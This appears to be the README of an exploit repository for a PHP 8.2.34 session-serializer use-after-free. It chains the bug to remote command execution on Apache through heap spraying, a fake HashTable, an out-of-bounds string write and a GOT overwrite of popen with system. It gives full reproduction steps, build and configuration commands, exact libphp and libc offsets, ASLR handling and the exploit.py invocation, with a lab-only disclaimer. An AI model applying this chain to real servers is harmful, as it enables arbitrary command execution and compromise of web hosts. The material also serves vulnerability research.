# CVE-2026-109618 / CVE-2026-109619 — PHP 8.2.34 session UAF → RCE (x86_64 lab)

A reproducible, in-band exploit for the PHP 8.2.34 session-serializer
use-after-free, taken from the proven primitives to **remote command
execution** on Apache prefork with a single worker.

This repository is the x86_64 rewrite of an aarch64 lab handover. It contains the
driver, the PHP trigger page, the lab configuration, and the full write-up of
what actually happens at the heap level.

> ## ⚠️ Authorization
> This is **lab-only** security research. Use it exclusively against systems you
> own or have explicit written permission to test. Do not point it at third
> parties, production systems, or the public internet. The author/operator
> assumes no liability for misuse.

---

## Status

| Target | Result |
|---|---|
| Instrumented `-g` PHP 8.2.34 module | **5/5** command execution, `apache2ctl graceful` between runs |
| Pristine, trace-free `-O2` module | **5/5** command execution, `apache2ctl graceful` between runs |
| Payload | `exploit.py --target http://HOST:PORT --cmd 'id>/tmp/P'` |
| Evidence | `/tmp/P` = `uid=33(www-data) gid=33(www-data) …` |

The exploit is **not** a one-shot remote bug: it needs the lab configuration
below and a PHP endpoint the attacker can cause to execute (the trigger page).

---

## Vulnerability summary

During a request that runs out of memory while **serialising the session** (the
upload-progress machinery serialises `$_SESSION` on every file-data update), the
`php_serialize_data` struct allocated by `php_var_serialize_init()` is left
dangling in the per-worker globals `BG(serialize).data` — its `level` stays ≥ 1,
so the real `php_var_serialize_destroy()` never runs. The next request served by
the **same worker** reuses that stale struct as a live `HashTable`: a
use-after-free.

`sizeof(struct php_serialize_data)` is 60 bytes → the 64-byte Zend MM bin.

Trigger geometry used here:

- Apache **prefork** with `MaxRequestWorkers=1` (guarantees the same worker).
- `session.serialize_handler = php_serialize` (**non-default**).
- `session.upload_progress.enabled = 1`, `cleanup = 0`, `freq = 100`.
- A session grown to the OOM edge (“ratchet”): repeated requests with 1000 file
  parts, each with a 4800-char filename and a new
  `PHP_SESSION_UPLOAD_PROGRESS` key, until a request OOMs during the shutdown
  serialise → poison armed.

---

## Server-side requirements

### Configuration

| Requirement | Why |
|---|---|
| PHP 8.2.34 built as an Apache module | the vulnerable code path |
| Apache **prefork**, `MaxRequestWorkers=1` | same worker must serve poison + consumer |
| `session.serialize_handler = php_serialize` | bug lives in the `php_serialize` serializer (default `php` is different) |
| `session.upload_progress.enabled = 1` (default) | serialise happens during multipart parsing, before the script |
| `session.upload_progress.cleanup = 0` | keeps the progress/edge state |
| `session.upload_progress.freq = 100` | OOM/serialise inside the request, not at shutdown |
| `file_uploads = 1` | progress only fires for real file parts |
| `post_max_size` ≥ ~3 MB, `max_input_vars` ≥ ~4000, `max_file_uploads ≥ 1` | the spray is 4000 fields × 736 B |
| `memory_limit = 128M` | the rearm must OOM while serialising the ~25 MB edge session |
| `session.use_strict_mode = 0`, writable `session.save_path` | attacker-chosen `PHPSESSID`; driver copies edge session files |
| a `$_SESSION` object with refcount > 1 | `php_add_var_hash()` only runs for those |

### PHP functions required by the trigger page

`strlen`, `substr`, `str_repeat`, `pack`, `hexdec`, `base64_decode`, `header`,
`file_put_contents`, and **`popen`**.

`popen` must **not** be in `disable_functions`. You do **not** need `system`,
`exec`, `shell_exec`, `eval`, `assert`, `include`, or `proc_open` — the GOT
hijack turns `popen` into `system` inside libphp.

`/tmp` must be writable by the web user (session files, markers, command output).

### Driver requirements

The driver reads `libphp`/`libc` load bases from `/proc/<pid>/maps`, so it must
run **on the host** (or with equivalent access). A fully remote variant would
need an in-band heap leak instead of `/proc`. This is a lab tool, not a
fire-and-forget remote exploit.

---

## Repository layout

```
.
├── exploit.py              # single entrypoint: --target URL --cmd "CMD"
├── poison.py               # poison/rearm/consume driver (requests + raw sockets)
├── leak.php                # trigger page: OOB string writes + GOT hijack
├── plant.php               # creates the consumer session (object with rc>1)
├── dbg.php                 # benign endpoint for the poison/rearm requests
├── diag.php                # debug helper
├── offsets.json            # symbols/layout for the instrumented x86_64 build
├── lab-config/
│   ├── php.ini             # exact lab php.ini
│   ├── apache-php-lab.conf # vhost + module config
│   └── uploads.ini         # original upload/session values
├── scripts/
│   ├── build_php.sh        # build instrumented -g and clean -O2 modules
│   ├── setup_apache.sh     # install php.ini + Apache vhost, prefork:1
│   └── make_edge.py        # ratchet a session to the OOM edge, copy to edge sid
├── RESULTS.md              # raw engineering log / gdb findings
└── README.md
```

---

## Quick start (fresh VM)

Assumes Debian/Ubuntu, root via sudo, and that `10.10.10.60`/loopback is the lab
host.

### 1. Dependencies

```sh
sudo apt-get update
sudo apt-get install -y apache2 apache2-dev build-essential autoconf bison re2c \
  pkg-config libxml2-dev libsqlite3-dev zlib1g-dev libssl-dev gdb curl python3-requests
```

### 2. Build PHP 8.2.34

```sh
cd ~
curl -fsSLO https://www.php.net/distributions/php-8.2.34.tar.gz
tar xf php-8.2.34.tar.gz
cd php-8.2.34
./configure --prefix=/opt/php-lab --with-apxs2=/usr/bin/apxs2 --disable-all \
  --enable-session --enable-ctype --enable-tokenizer --enable-filter --enable-cli \
  CFLAGS="-g -O2"
make -j"$(nproc)" && sudo make install
```

The instrumented build additionally needs the `[ser]` traces in
`ext/standard/var.c` (and their `fflush(stderr)`); without them you cannot
calibrate geometry on the instrumented build. The **clean** `-O2` build is the
same configure with `CFLAGS="-O2"` and **no** source instrumentation.

### 3. Apache + php.ini

```sh
sudo cp lab-config/php.ini /etc/php-lab/php.ini
sudo cp lab-config/apache-php-lab.conf /etc/apache2/conf-available/php-lab.conf
sudo a2dismod mpm_event mpm_worker
sudo a2enmod mpm_prefork
sudo a2enconf php-lab
# enforce one worker
sudo sed -i 's/^StartServers.*/StartServers 1/;s/^MinSpareServers.*/MinSpareServers 1/;s/^MaxSpareServers.*/MaxSpareServers 1/;s/^MaxRequestWorkers.*/MaxRequestWorkers 1/;s/^ServerLimit.*/ServerLimit 1/' /etc/apache2/mods-available/mpm_prefork.conf
# /tmp must be visible to the worker (systemd PrivateTmp=false)
sudo mkdir -p /etc/systemd/system/apache2.service.d
printf '[Service]\nPrivateTmp=false\n' | sudo tee /etc/systemd/system/apache2.service.d/lab.conf
sudo systemctl daemon-reload && sudo systemctl restart apache2
```

Deploy the pages:

```sh
sudo cp leak.php plant.php dbg.php diag.php /var/www/lab/
sudo chmod 644 /var/www/lab/*.php
```

### 4. Create the at-the-edge session

The exploit needs a session serialised to ~25 MB (the OOM edge). With the
instrumented build:

```sh
python3 scripts/make_edge.py
```

This ratchets `PHP_SESSION_UPLOAD_PROGRESS` keys with 1000-part requests until
`[ser] INIT FRESH` appears without a following `DESTROY`, then copies the session
to the edge sid used by the exploit. (See `RESULTS.md` for the manual procedure
and the `poison.py ratchet` command.)

### 5. Run it

```sh
python3 exploit.py --target http://127.0.0.1:8084 --cmd 'id>/tmp/P' --verify /tmp/P
sudo cat /tmp/P
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The driver calibrates geometry, poisons a fresh worker, and retries a bounded
number of workers if ASLR places libphp below the covering string.

### 6. Clean `-O2` build

Swap `libphp.so` for the clean build (same `popen@got` offset, same RELRO
boundary), restart Apache, and run the same command. On the clean module the
driver goes trace-free: `A = libphp_base − 0x391000`, `cover_idx=1039`,
`cover_off=488`.

---

## How the exploit works

1. **Poison (rearm).** Copy the edge session to a fresh sid and fire the
   1000-part request. The shutdown serialise OOMs, leaving a dangling
   `php_serialize_data` at `d`. This is observed as `[ser] INIT FRESH d=…` with
   no `DESTROY` (instrumented build).

2. **Covering string.** The next request (a *different* sid, because the OOM
   leaks the session `flock`) is parsed with ~4000 spray fields of 736 bytes.
   The freed 64-byte struct is overwritten by a spray string. 736 bytes is
   deliberate: it fills the 768-byte MM chunk up to offset 760, so the hash slot
   at `arData−4 = A−60` is initialised `0xFF` instead of landing in uninitialised
   slack (that was a real SIGSEGV found with gdb).

3. **Fake HashTable.** The spray at `cover_idx` places a fake `HashTable` in the
   string data at the struct offset:
   - `nTableMask = 0xFFFFFFFF`, so the slot index is always `arData−4`
     (a constant, correct for every object pointer);
   - `nNumUsed = 1`, attacker-chosen `arData` (`= A − 56`);
   - `nTableSize = 0xFFFFFFFF` (no resize).

   During upload-progress serialisation, `php_add_var_hash()` writes two
   buckets. The first overwrites the string `gc` (refcount → 0); the second
   overwrites `len`, which becomes a positive ~4 GB value
   (**`0x100000308` on x86_64**; the aarch64 notes had `0x100000008` because the
   zval `type_info` differs).

4. **Forward OOB write.** `strlen($s)` is now ~4 GB. With `rc = 0`, the page's
   local `$s = $_POST[$key]` is in-place and `$s[$off] = $byte` gives a
   byte-granular write anywhere forward of the string data.

5. **GOT hijack.** `libphp` is mapped at a random address. When it is **above**
   `A`, the window reaches its writable GOT. `popen@got` (offset `0x5e2f18`) is
   outside the RELRO range (`0x557488 + 0x88b78 = 0x5e0000`). Overwrite it with
   libc `system` (offset `0x53090`, libc base from `/proc/<pid>/maps`), call
   `@popen($cmd, "r")` → `system($cmd)`, then restore the GOT.

6. **ASLR.** `A − libphp_base` is one of two layout constants; only
   `A = base − 0x390000` (`-g` build) / `− 0x391000` (`-O2` build) puts libphp
   above `A`. The driver checks `popen@got > A+24` and re-arms a fresh worker
   otherwise. Observed success within 1–6 attempts.

### Why not the original fake-object → `zend_eval_string` chain?

gdb ground truth on this build: `$_POST->arData` and the bucket for the covering
field are **36 MB below `A`** while the OOB window is forward-only (a
`zend_string` cannot be repointed). The `strpos($s, A)` locator therefore runs
into unmapped memory. The GOT route reaches libphp directly, needs no bucket,
and is simpler. `zend_eval_string` via GOT was tried and crashes on its third
argument (`string_name`), which `popen` cannot supply.

---

## Debugging notes (what cost the most time)

- Apache children **block-buffer `stderr`**; every trace line needs
  `fflush(stderr)` or it never appears.
- A **query string** on the trigger request allocates a `$_GET` array in the
  64-byte bin and steals the freed struct. Pass exploit parameters as HTTP
  headers (`X-Lab-*`), not query parameters.
- **Uninitialised slack**: with 616-byte sprays, `arData−4 = A−60` lands in the
  previous chunk's uninitialised tail; the slot value is garbage → wild bucket →
  SIGSEGV in `zend_hash_index_find_bucket`. 736-byte sprays fix it.
- The OOM'd request **leaks the session `flock`**; reusing the same sid
  deadlocks the single worker. The consumer must use a different sid.
- Clean vs `-g` builds differ by **one page** in the `A − base` delta
  (`0x391000` vs `0x390000`).

---

## Limitations

- Trace-free clean build uses per-build layout constants (`delta`, `cover_idx`,
  `cover_off`) rather than per-run calibration; a trace-free in-band `A` leak was
  not found on this heap layout.
- The driver needs host access to `/proc/<pid>/maps`; a remote-only variant
  would need an in-band leak.
- `popen` must be enabled.
- Other PHP versions are out of scope.

---

## Test matrix

| Test | Result |
|---|---|
| Instrumented `-g`, 5 runs, graceful between | 5/5 `/tmp/P` = uid=33(www-data) |
| Clean `-O2`, 5 runs, graceful between | 5/5 `/tmp/P` = uid=33(www-data) |
| Wrong geometry | page reports `GEOMETRY_FAIL`, no silent no-op |
| Module below `A` (ASLR) | driver detects, re-arms a fresh worker |

See `RESULTS.md` for the full log, gdb backtraces, and address measurements.

---

## References

- PHP session serialisation: `ext/session/session.c`,
  `ext/standard/var.c` (`php_add_var_hash`).
- Multipart parser: `main/rfc1867.c`.
- Zend hash lookup: `Zend/zend_hash.c` (`zend_hash_index_find_bucket`).
- Zend MM bins and chunk layout: `Zend/zend_alloc.c`.
